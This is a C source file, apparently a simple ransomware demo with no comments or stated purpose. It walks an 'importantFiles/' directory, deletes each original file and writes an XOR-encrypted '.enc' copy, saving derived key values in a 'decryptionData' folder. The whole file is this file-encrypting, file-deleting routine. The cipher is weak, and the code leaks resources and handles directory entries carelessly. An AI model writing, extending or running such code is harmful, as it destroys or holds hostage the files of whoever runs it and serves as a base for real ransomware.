#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/stat.h> 
#include <unistd.h>

char* getFileContent(FILE *f, long *len);
void byteManipulation(char *buffer, long len, int *arr, char *filepath);
int helper(int * arr, long i);
int* createRandomOrder(long len, char* fileName);
int is_regular_file(const char *path);

#define MAX_LEN 200
const char *userDataPath = "importantFiles/";
const char *decDataPath = "importantFiles/decryptionData/";

int is_regular_file(const char *path)
{
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

int main()
{   
    DIR *d, *d_Dec;
   
    d = opendir(userDataPath);
    d_Dec = opendir(decDataPath);
    if(d_Dec == NULL)
        mkdir(decDataPath, 0700);
    struct dirent *dir;
    while((dir = readdir(d)) != NULL) 
    {
        char *filepath = malloc(sizeof(char)* MAX_LEN);
        filepath[0] = '\0';
        strcat(filepath, userDataPath);
        strcat(filepath, dir->d_name);
        if(!is_regular_file(filepath))
            continue;
        FILE *f = fopen(filepath,"rb");
        if(!strcmp(dir->d_name, "..") || !strcmp(dir->d_name, "."))
            continue;
        if(!f)
            return -1;
        long len;
        char* buffer = getFileContent(f, &len);
        int *arr = createRandomOrder(len, dir->d_name);
        byteManipulation(buffer, len, arr, filepath);
    }
    return 1;
}

void byteManipulation(char *buffer, long len, int *arr, char *filepath)
{ 
    remove(filepath);
    strcat(filepath, ".enc");
    FILE *f = fopen(filepath,"wb");
    if(f == NULL)
        return;
    for(long i = 0; i < len; i++)
    {
        buffer[i] ^= arr[i];
        fwrite(buffer + i, sizeof(char), 1, f);
    }
}

int helper(int *arr, long i)
{
    int r = arr[i];
    if(r % 2 == 0)
        r ++;
    else
        r *= 2;
    return r;
}

int* createRandomOrder(long len, char* fileName)
{
    FILE *f;
    char *filePath = malloc(sizeof(char)* MAX_LEN);
    filePath[0] = '\0';
       
    strcat(filePath, decDataPath);
    strcat(filePath, fileName);
    strcat(filePath, ".enc.dat"); 

    f = fopen(filePath,"wb");

    srand(time(NULL)); 
    int* arr = malloc(sizeof(int) * len);
    for(long i = 0; i < len; i++)
    {
        int r = rand() % 256 + 1; 
        arr[i] = r;
        int x = helper(arr,i);
        fwrite(&x, sizeof(int), 1, f);
    }
    fclose(f);
    free(filePath);
    return arr;
}

char* getFileContent(FILE *f, long *len)
{
    char *buffer;
    fseek(f, 0, SEEK_END);         
    *len = ftell(f);            
    rewind(f);  
    buffer = (char *)malloc(*len * sizeof(char)); 
    fread(buffer, *len, 1, f); 
    fclose(f);
    return buffer;
}